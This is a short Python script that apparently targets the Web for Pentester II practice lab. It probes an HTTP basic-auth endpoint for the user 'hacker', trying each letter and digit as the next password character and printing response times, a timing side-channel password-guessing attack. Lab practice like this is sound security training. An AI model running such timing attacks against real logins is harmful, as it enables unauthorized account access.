import requests, sys, string
from string import ascii_lowercase, digits

wfp2_site = sys.argv[1]

url = f'''http://{wfp2_site}/authentication/example2/'''

password = ''

for c in list(ascii_lowercase + digits):
    response = requests.get(url, auth=('hacker', password + c))
    print(f'Char {c}: {response.elapsed.total_seconds()} {response.text.rstrip()}')
